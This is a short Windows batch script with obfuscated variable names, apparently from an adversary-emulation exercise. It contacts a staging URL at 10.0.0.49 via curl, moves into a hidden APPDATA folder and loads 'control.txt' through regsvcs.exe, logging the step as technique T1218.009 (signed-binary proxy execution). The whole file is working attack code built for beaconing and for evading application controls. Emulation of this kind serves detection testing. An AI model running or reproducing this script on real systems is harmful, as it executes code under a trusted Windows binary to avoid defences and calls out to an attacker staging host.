@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\8549\ee7f781f
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8549-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=control.txt
SET ewjmdkff=8549
SET qtfgg=%APPDATA%\%pudaazx%
SET aswfg=%qtfgg%\macula-simulations.log
SET jhgvx=1
SET ftgvr=

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_start>> "%aswfg%" 2>nul
curl -k -s -o nul "%drguvr%"
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: heartbeat_complete>> "%aswfg%" 2>nul

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: chdir_start=%pjkcpgw%>> "%aswfg%" 2>nul
cd /d "%pjkcpgw%" 2>nul
if errorlevel 1 (
SET jhgvx=0
SET ftgvr=chdir_failed
)
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: chdir_complete=%cd%>> "%aswfg%" 2>nul

echo [%DATE% %TIME%][DEBUG][%hlbnp%]: regsvcs_start=%syjfr%>> "%aswfg%" 2>nul
regsvcs.exe "%syjfr%" 2>nul
if errorlevel 1 (
SET jhgvx=0
SET ftgvr=assembly_load_failed
)
echo [%DATE% %TIME%][DEBUG][%hlbnp%]: regsvcs_complete=%errorlevel%>> "%aswfg%" 2>nul

echo [%DATE% %TIME%][%hlbnp%]: %pudaazx%-%ewjmdkff%-T1218.009|Regsvcs=%jhgvx%:%ftgvr%>> "%aswfg%" 2>nul
ENDLOCAL